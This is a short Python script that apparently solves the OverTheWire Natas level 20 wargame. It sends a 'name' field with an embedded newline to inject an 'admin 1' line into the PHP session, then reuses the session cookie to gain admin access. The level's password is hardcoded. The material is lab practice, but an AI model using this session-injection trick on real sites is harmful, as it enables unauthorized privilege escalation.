import requests
from urllib.parse import quote

host = 'http://natas20.natas.labs.overthewire.org/index.php'
auth = ('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')

data = { 'name' : '\nadmin 1' }
req = requests.post(host, data=data, auth=auth)
session_id = req.cookies.get("PHPSESSID")

r = requests.post(host, auth=auth, cookies={'PHPSESSID': session_id})
print(r.status_code)
print(r.text)